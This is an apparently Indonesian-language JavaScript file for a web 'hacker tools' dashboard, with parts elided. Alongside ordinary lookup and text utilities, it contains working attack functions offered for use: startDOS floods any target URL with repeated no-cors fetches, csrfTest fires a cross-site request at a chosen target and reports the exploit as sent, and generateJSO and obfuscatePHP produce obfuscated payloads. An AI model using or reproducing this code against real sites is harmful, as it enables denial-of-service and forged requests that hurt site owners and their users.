...
function loadUserInfo() {
  try {
    ...
    const els = document.querySelectorAll('#bannerUsername, #sidebarUsername');
    els.forEach(el => { if(el) el.textContent = payload.username || 'User'; });
  } catch(e) {}
}
...
function copyText(id) {
  ...
  if(!el || !el.value) return alert('Tidak ada teks!');
  el.select();
...
function clearResult(id, statusId) {
  const el = document.getElementById(id);
  if(el) { el.textContent = ''; if(el.tagName === 'TEXTAREA') el.value = ''; }
  if(statusId) { const s = document.getElementById(statusId); if(s) s.textContent = ''; }
}
...
async function getSource() {
  ...
  setStatus('srcStatus', 'Mengambil source...');
  try {
    const res = await fetch('https://api.allorigins.win/raw?url=' + encodeURIComponent(url));
    const text = await res.text();
    document.getElementById('srcResult').value = text;
    setStatus('srcStatus', 'Berhasil!');
  } catch { setStatus('srcStatus', 'Gagal'); }
}

fetch('https://api64.ipify.org?format=json')
  .then(r => r.json())
  .then(d => document.getElementById('ipResult').textContent = 'IP: ' + d.ip)
  .catch(() => document.getElementById('ipResult').textContent = 'Gagal');
...
async function getHeaders() {
  ...
  try {
    ...
    document.getElementById('hdResult').textContent = h || 'Tidak ada headers.';
  } catch { document.getElementById('hdResult').textContent = 'Gagal'; }
}
...
async function getDomainIP() {
  ...
  } catch { document.getElementById('domResult').textContent = 'Gagal'; }
}
...
async function getGeoIP() {
  ...
  try {
    ...
    const data = await res.json();
    if(!data.success) { document.getElementById('geoResult').textContent = 'IP tidak ditemukan'; return; }
    document.getElementById('geoResult').textContent = 'IP: ' + data.ip + '\nNegara: ' + data.country + '\nKota: ' + data.city + '\nISP: ' + data.isp;
  } catch { document.getElementById('geoResult').textContent = 'Gagal'; }
}
...
async function dnsLookup() {
  ...
  try {
    ...
    const data = await res.json();
    let out = 'Record ' + type + ':\n';
    if(data.Answer && data.Answer.length > 0) data.Answer.forEach(a => out += a.data + '\n');
    else out += 'Tidak ditemukan.';
    document.getElementById('dnsResult').textContent = out;
  } catch { document.getElementById('dnsResult').textContent = 'Gagal'; }
}

function minifyHTML() {
  const html = document.getElementById('minifyInput').value;
  if(!html) return alert('Masukkan HTML!');
...
async function findSubdomain() {
  ...
  if(!domain) return alert('Masukkan domain!');
  document.getElementById('subResult').textContent = 'Mencari...';
...
async function crawlEndpoint() {
  ...
  } catch { document.getElementById('crawlResult').textContent = 'Gagal'; }
}
...
function convertText() {
  ...
  if(!text) return alert('Masukkan teks!');
  let result = '';
  if(type === 'ascii') result = text.split('').map(c => c.charCodeAt(0)).join(' ');
  else if(type === 'binary') result = text.split('').map(c => c.charCodeAt(0).toString(2).padStart(8,'0')).join(' ');
  else if(type === 'base64') result = btoa(text);
  else if(type === 'hex') result = text.split('').map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
...
async function reverseIP() {
  ...
  if(!input) return alert('Masukkan domain atau IP!');
  document.getElementById('revResult').textContent = 'Mencari...';
  try {
    const ip = input.match(/^\d+\.\d+\.\d+\.\d+$/) ? input : await fetch('https://dns.google/resolve?name=' + input).then(r => r.json()).then(d => d.Answer ? d.Answer[0].data : null);
    if(!ip) { document.getElementById('revResult').textContent = 'Tidak ditemukan IP.'; return; }
    const res = await fetch('https://api.hackertarget.com/reverseiplookup/?q=' + ip);
    const data = await res.text();
    document.getElementById('revResult').textContent = data || 'Tidak ditemukan.';
  } catch { document.getElementById('revResult').textContent = 'Gagal'; }
}
...
function generateJSO() {
  ...
  document.getElementById('jsoResult').value = 'var _0x' + Math.random().toString(36).substring(2,8) + '=atob("' + encoded + '");document.write(_0x' + Math.random().toString(36).substring(2,8) + ');';
}
...
function obfuscatePHP() {
  ...
  if(!code) return alert('Masukkan kode PHP!');
  let result = code;
  if(level === 'low') result = code.replace(/\$([a-zA-Z_]\w*)/g, '$$_$1');
  else if(level === 'medium') {
    const vars = ['a','b','c','d','e','f','g','h','i','j'];
    let idx = 0;
    result = code.replace(/\$([a-zA-Z_]\w*)/g, function() { return '$' + vars[idx++ % vars.length]; });
  } else {
...
function csrfTest() {
  ...
  if(!url) return alert('Masukkan target URL!');
  document.getElementById('csrfResult').textContent = 'Mengirim exploit...';
  ...
  }).then(() => { document.getElementById('csrfResult').textContent = 'Exploit terkirim!'; })
    .catch(() => { document.getElementById('csrfResult').textContent = 'Exploit terkirim (no-cors).'; });
}
...
function startDOS() {
  ...
  if(dosInterval) { alert('Serangan sedang berjalan!'); return; }
  dosCount = 0;
  document.getElementById('dosResult').textContent = 'Menyerang ' + url + '...';
  dosInterval = setInterval(() => {
    for(let i = 0; i < 20; i++) {
      fetch(url, {mode:'no-cors'}).catch(() => {});
      dosCount++;
    }
    document.getElementById('dosResult').textContent = 'Paket: ' + dosCount + ' | Target: ' + url;
  }, 100);
  setTimeout(() => {
    clearInterval(dosInterval);
    dosInterval = null;
    document.getElementById('dosResult').textContent = 'Selesai. Total paket: ' + dosCount;
  }, dur * 1000);
}
...
function stopDOS() {
  if(dosInterval) {
    clearInterval(dosInterval);
    dosInterval = null;
    document.getElementById('dosResult').textContent = 'Dihentikan. Paket: ' + dosCount;
  }
}
...
document.addEventListener('DOMContentLoaded', () => {
  ...
  document.querySelectorAll("#sidebar a").forEach(link => {
    link.addEventListener("click", () => {
      ...
      document.getElementById("backdrop")?.style.setProperty('display', 'none');
    });
  });
});
